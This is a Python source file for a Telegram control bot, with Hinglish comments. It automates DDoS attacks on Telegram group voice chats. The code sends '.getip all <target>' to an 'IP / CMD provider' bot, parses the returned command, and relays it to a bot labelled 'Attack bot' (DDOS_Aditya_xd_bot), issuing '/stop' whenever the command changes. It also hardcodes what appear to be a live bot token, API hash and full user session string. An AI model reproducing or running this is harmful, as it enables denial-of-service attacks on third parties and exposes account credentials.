import asyncio
import re
from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
)

# --------------- TELEGRAM CONFIG ---------------

API_ID = 36295148
API_HASH = "bee66be844e3be0e314508e92a7c4e7d"

BOT_TOKEN = "8473172869:AAG1B8DvV4dwodGudTz11cBed2iq-DDReSY"

# Telethon user session (TG test controller account)
STRING_SESSION = "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qUIIMziiQPAG5irsAx37rfUZra0WJqTRjSox2F7NSUqUi9_bSizm3sfw3Ez5GszsCnrgY7IVixINZgjWQobFkg4JmOePZb14z6XNO1e1oqNQ_oxugaQN0cBB3IWaH0BaY4G8-O4IfF3GsY_QIbFlLdJeLCxIA6Tah1SHTrTdK4reg_9Vig2snpHSri02cNdkoawDBk1QUyo3mL6r4v7uuO0b5w7LpwjCmJnvYUaWOH0uy14seFuaU4gSnQNvvz79sK_p8vQoZm6h2HLUIOwZLZRugWZ-_iRiaYiU="

# Bot usernames (without @)
BOT_A_USERNAME = "botbysahilbot"          # IP / CMD provider
BOT_B_USERNAME = "DDOS_Aditya_xd_bot"     # Attack bot


# --------------- GLOBALS ---------------

tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)

BOT_A_ID = None
BOT_B_ID = None

# per-chat state
# keys: armed, bot_ready, running, current_cmd, pending_cmd, target
chat_state: dict[int, dict] = {}


# --------------- FSM HELPERS ---------------

async def try_execute(cid: int):
    """Agar bot READY hai aur pending CMD hai to BOT_B ko attack command bhejo."""
    state = chat_state.get(cid)
    if not state:
        return
    if not state["armed"]:
        return
    if not state["bot_ready"]:
        return
    if not state["pending_cmd"]:
        return
    if not state["target"]:
        return

    cmd = state["pending_cmd"]

    state["current_cmd"] = cmd
    state["pending_cmd"] = None
    state["running"] = True
    state["bot_ready"] = False

    print(f"[FSM {cid}] START CMD -> {cmd} | target={state['target']}")
    try:
        await tele.send_message(BOT_B_ID, cmd)
        print(f"[FSM {cid}] SENT CMD to BOT_B OK")
    except Exception as e:
        print(f"[FSM {cid}] ERROR sending to BOT_B:", repr(e))


async def cancel_task(cid: int):
    """Current attack stop karo (BOT_B ko /stop)."""
    state = chat_state.get(cid)
    if not state or not state["running"]:
        return

    print(f"[FSM {cid}] STOP CMD -> {state['current_cmd']}")
    try:
        await tele.send_message(BOT_B_ID, "/stop")
    except Exception as e:
        print(f"[FSM {cid}] ERROR sending /stop to BOT_B:", repr(e))

    state["running"] = False
    state["current_cmd"] = None


# --------------- TELETHON LISTENERS ---------------

@tele.on(events.NewMessage)
async def tele_listener(event):
    """BOT_A ke CMD aur BOT_B ke READY / STATUS messages handle karta hai."""
    global BOT_A_ID, BOT_B_ID

    sender = await event.get_sender()
    if not sender:
        return

    sender_id = sender.id
    text = event.text or ""

    # ------------ BOT A (IP / CMD provider) ------------
    if BOT_A_ID is not None and sender_id == BOT_A_ID:
        print("📩 IP BOT REPLY:", text)

        # CMD line nikaalna (CMD:, **CMD:**, `CMD:` etc.)
        m = re.search(r"CMD[:*s`]*s*(.+)", text, flags=re.IGNORECASE)
        if not m:
            return

        cmd = m.group(1).strip()
        cmd = cmd.replace("**", "").replace("`", "").strip()

        print("✅ FINAL CMD:", cmd)

        for cid, state in chat_state.items():
            if not state["armed"]:
                continue
            if not state["target"]:
                continue

            if cmd == state["current_cmd"]:
                print(f"[FSM {cid}] Same CMD already running, ignore.")
                continue

            if state["running"]:
                state["pending_cmd"] = cmd
                print(f"[FSM {cid}] New CMD while running -> queue + /stop.")
                await cancel_task(cid)
            else:
                state["pending_cmd"] = cmd
                print(f"[FSM {cid}] Idle -> pending set, try_execute (if READY).")
                await try_execute(cid)

    # ------------ BOT B (attack bot / READY status) ------------
    if BOT_B_ID is not None and sender_id == BOT_B_ID:
        low = text.lower()
        print("DDOS BOT MSG:", repr(text))

        is_ready = (
            "✅ **ʀᴇᴀᴅʏ**" in text
            or "ɴᴏ ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ" in text
            or "ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴀ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ" in text
            or "no attack running" in low
            or "you can start a new attack" in low
        )

        if not is_ready:
            return

        for cid, state in chat_state.items():
            if not state["armed"]:
                continue
            state["bot_ready"] = True
            await try_execute(cid)


# --------------- PTB COMMAND HANDLERS ---------------

async def cmd_setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Attack target VC / chat set karta hai."""
    cid = update.effective_chat.id

    if not context.args:
        await update.message.reply_text(
            "Usage: /setlinkchatid <group_link_or_chatid>"
        )
        return

    target = " ".join(context.args).strip()
    state = chat_state.get(cid)

    if not state:
        chat_state[cid] = {
            "armed": False,
            "bot_ready": False,
            "running": False,
            "current_cmd": None,
            "pending_cmd": None,
            "target": target,
        }
    else:
        state["target"] = target

    await update.message.reply_text(
        f"✅ Target saved for this chat:`{target}`",
        parse_mode="Markdown",
    )


async def cmd_startfsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Event-driven FSM ON + BOT_A se auto .getip all."""
    cid = update.effective_chat.id
    old = chat_state.get(cid)

    chat_state[cid] = {
        "armed": True,
        "bot_ready": False,
        "running": False,
        "current_cmd": None,
        "pending_cmd": None,
        "target": old["target"] if old and "target" in old else None,
    }
    state = chat_state[cid]
    target = state["target"]

    await update.message.reply_text(
        f'''✅ Event-driven mode ON.
        • /setlinkchatid se target set karo.
        "• BOT_A (.getip) se jo CMD aayega wo auto parse hoga.
        "• BOT_B READY hote hi pending attack auto start hoga.
        "• Naya CMD aane par purana auto /stop + naya start.'''
    )

    if target:
        msg = f".getip all {target}"
        print(f"[FSM {cid}] AUTO SEND to BOT_A:", msg)
        try:
            await tele.send_message(BOT_A_ID, msg)
        except Exception as e:
            print(f"[FSM {cid}] ERROR sending to BOT_A:", repr(e))


async def cmd_stopfsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """FSM OFF + running attack stop."""
    cid = update.effective_chat.id
    if cid in chat_state:
        await cancel_task(cid)
        chat_state.pop(cid, None)

    await update.message.reply_text(
        "🛑 Event-driven system stopped for this chat."
    )


# --------------- MAIN ---------------

async def main():
    global BOT_A_ID, BOT_B_ID

    await tele.start()
    print("Telethon connected")

    bot_a = await tele.get_entity(BOT_A_USERNAME)
    bot_b = await tele.get_entity(BOT_B_USERNAME)
    BOT_A_ID = bot_a.id
    BOT_B_ID = bot_b.id
    print("BOT_A_ID:", BOT_A_ID, "BOT_B_ID:", BOT_B_ID)

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("setlinkchatid", cmd_setlink))
    app.add_handler(CommandHandler("startfsm", cmd_startfsm))
    app.add_handler(CommandHandler("stopfsm", cmd_stopfsm))

    print("Control bot running (event-driven)")

    ptb_task = asyncio.create_task(app.run_polling(close_loop=False))

    try:
        await tele.run_until_disconnected()
    finally:
        await app.stop()
        await app.shutdown()
        ptb_task.cancel()


if __name__ == "__main__":
    asyncio.run(main())